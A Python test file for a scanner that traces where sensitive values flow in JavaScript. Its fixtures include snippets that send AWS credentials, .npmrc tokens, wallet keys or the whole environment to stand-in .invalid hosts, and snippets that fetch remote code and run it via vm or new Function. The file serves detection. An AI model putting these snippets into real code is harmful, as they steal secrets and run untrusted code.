"""Where a JavaScript file's sensitive values go (`detect/js_flow.py`).

Fixtures name hosts under `.invalid` and assemble command words, so the repository's own scan has
nothing to report in them.
"""

from __future__ import annotations

from cordon_scanner.detect.js_flow import JsFlow, _Analysis


class FlowKit:
    @staticmethod
    def flows(text: str) -> list[tuple[list[str], str, str]]:
        return [(sorted(f.sources), f.sink, f.destination) for f in JsFlow.flows(text)]


class TestSources:
    def test_a_credential_file_through_two_helpers(self) -> None:
        text = (
            'const fs = require("fs");\n'
            "function load(p) { return fs.readFileSync(p); }\n"
            'function enc(x) { return Buffer.from(x).toString("base64"); }\n'
            'function send(d) { return require("axios").post("https://a.invalid/u", {d}); }\n'
            'const p = require("path").join(require("os").homedir(), ".aws", "credentials");\n'
            "send(enc(load(p)));\n"
        )
        assert (["home_file", "secret_file"], "request", "fixed") in FlowKit.flows(text)

    def test_a_file_read_in_a_callback(self) -> None:
        text = (
            'const fs = require("fs"); const https = require("https");\n'
            'fs.readFile(process.env.HOME + "/.npmrc", "utf8", (err, txt) => {\n'
            '  const req = https.request({hostname: "h.invalid", method: "POST"});\n'
            "  req.write(txt); req.end();\n"
            "});\n"
        )
        assert any("secret_file" in s for s, _, _ in FlowKit.flows(text))

    def test_a_key_handed_to_a_function_as_private_key(self) -> None:
        text = (
            "export async function createWallet(privateKey) {\n"
            '  await fetch("https://api.invalid/log", {method: "POST", body: privateKey});\n'
            "}\n"
        )
        assert FlowKit.flows(text) == [(["wallet_key"], "request", "fixed")]

    def test_the_whole_environment_in_a_lookup(self) -> None:
        text = (
            'const dns = require("dns");\n'
            'const h = Buffer.from(JSON.stringify(process.env)).toString("hex") + ".x.invalid";\n'
            "dns.lookup(h, () => {});\n"
        )
        assert FlowKit.flows(text) == [(["environment"], "dns", "unknown")]


class TestRemoteCode:
    def test_a_reply_run_through_vm_under_another_name(self) -> None:
        text = (
            'var salt = require("https"); var mk = require("vm");\n'
            'salt.request("https://x.invalid/p", {}, (res) => {\n'
            '  let body = "";\n'
            '  res.on("data", (p) => body += p);\n'
            '  res.on("end", () => mk.runInContext(body, mk.createContext({})));\n'
            "});\n"
        )
        assert (["network_response"], "execute", "unknown") in FlowKit.flows(text)

    def test_a_promise_chain_into_new_function(self) -> None:
        text = 'const axios = require("axios");\naxios.get("https://x.invalid/s").then(r => { new Function(r.data)(); });\n'
        assert (["network_response"], "execute", "unknown") in FlowKit.flows(text)

    def test_a_reply_that_is_only_parsed_is_quiet(self) -> None:
        text = 'async function go() {\n  const r = await fetch("https://api.invalid/x");\n  console.log(await r.json());\n}\n'
        assert FlowKit.flows(text) == []


class TestQuiet:
    def test_a_client_sending_its_own_token(self) -> None:
        text = (
            'const axios = require("axios");\nconst token = process.env.GITHUB_TOKEN;\n'
            'module.exports = (q) => axios.get("https://api.github.com/search?q=" + q, {headers: {Authorization: token}});\n'
        )
        assert FlowKit.flows(text) == []

    def test_a_config_file_in_the_project(self) -> None:
        text = 'const fs = require("fs");\nconst cfg = JSON.parse(fs.readFileSync("./config.json"));\nfetch(cfg.url, {body: JSON.stringify(cfg)});\n'
        assert FlowKit.flows(text) == []


class TestDestinations:
    def test_known_drop_points_bare_addresses_and_private_ranges(self) -> None:
        assert _Analysis.classify("https://webhook.site/abc")[1] == "drop"
        assert _Analysis.classify("https://discord.com/api/webhooks/1/x")[1] == "drop"
        assert _Analysis.classify("https://discord.com/app")[1] == "fixed"
        assert _Analysis.classify("http://203.0.113.9/x")[1] == "ip"
        assert _Analysis.classify("http://127.0.0.1:9222/json")[1] == "fixed"
        assert _Analysis.classify("plain text mentioning toast.js")[1] == "unknown"


class TestBounds:
    def test_a_large_generated_file_finishes(self) -> None:
        text = "".join(f"function f{i}(a) {{ return g{i}(a) + {i}; }}\n" for i in range(20_000))
        assert JsFlow.flows(text) == []
